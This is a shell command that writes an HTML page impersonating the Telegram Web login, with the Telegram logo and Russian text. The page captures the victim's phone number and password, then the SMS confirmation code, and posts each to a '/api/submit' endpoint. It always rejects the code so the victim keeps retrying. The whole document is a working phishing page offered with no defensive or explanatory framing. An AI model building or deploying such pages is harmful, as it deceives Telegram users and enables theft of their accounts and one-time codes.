cat > public/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Telegram Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #2a2a2a 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 28px;
            width: 100%;
            max-width: 400px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        .logo svg { width: 80px; height: 80px; }
        h2 { margin: 20px 0; color: #333; }
        .input-group { margin: 15px 0; }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 2px solid #ddd;
            border-radius: 16px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #27A5E7;
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background: #1e8bc3; }
        .error {
            background: #fee;
            color: #c33;
            padding: 12px;
            border-radius: 16px;
            margin-top: 15px;
            display: none;
        }
        .code-step { display: none; }
        .back-link { margin-top: 15px; }
        .back-link a { color: #888; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 240 240">
                <circle cx="120" cy="120" r="120" fill="#27A5E7"/>
                <path fill="white" d="M98,175c-3.9,0-4.2-1.6-6-5.8l-15-49l84-54l-104,42l-32,13c-6,2-6,5.7-1.1,7.9l26,8l60-38c2.5-1.5,4.8-0.7,2.9,0.9L98,175z"/>
            </svg>
        </div>
        <h2 id="title">Вход в Telegram</h2>
        
        <div id="step1">
            <form id="loginForm">
                <div class="input-group">
                    <input type="tel" id="phone" placeholder="+7 (900) 123-45-67" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Пароль" required>
                </div>
                <button type="submit">Продолжить</button>
            </form>
        </div>
        
        <div id="step2" class="code-step">
            <form id="codeForm">
                <div class="input-group">
                    <input type="text" id="code" placeholder="Код из SMS" maxlength="6" required>
                </div>
                <button type="submit">Подтвердить</button>
                <div class="back-link">
                    <a href="#" onclick="back()">← Использовать другой номер</a>
                </div>
            </form>
        </div>
        
        <div class="error" id="error"></div>
    </div>

    <script>
        let userPhone = '', userPassword = '';
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            userPhone = document.getElementById('phone').value;
            userPassword = document.getElementById('password').value;
            
            if (!userPhone || !userPassword) {
                showError('Заполните все поля');
                return;
            }
            
            try {
                const response = await fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: userPhone, password: userPassword, step: 1 })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('step1').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                    document.getElementById('title').innerText = 'Подтверждение входа';
                } else {
                    showError(data.error || 'Ошибка');
                }
            } catch (err) {
                showError('Ошибка соединения');
            }
        });
        
        document.getElementById('codeForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = document.getElementById('code').value;
            
            if (!code || code.length < 5) {
                showError('Введите код');
                return;
            }
            
            try {
                const response = await fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: userPhone, password: userPassword, code: code, step: 2 })
                });
                
                const data = await response.json();
                showError(data.error || 'Неверный код');
                document.getElementById('code').value = '';
                
            } catch (err) {
                showError('Ошибка');
            }
        });
        
        function showError(msg) {
            const errorDiv = document.getElementById('error');
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
        }
        
        function back() {
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
            document.getElementById('title').innerText = 'Вход в Telegram';
            document.getElementById('code').value = '';
            document.getElementById('phone').value = '';
            document.getElementById('password').value = '';
        }
    </script>
</body>
</html>
EOF
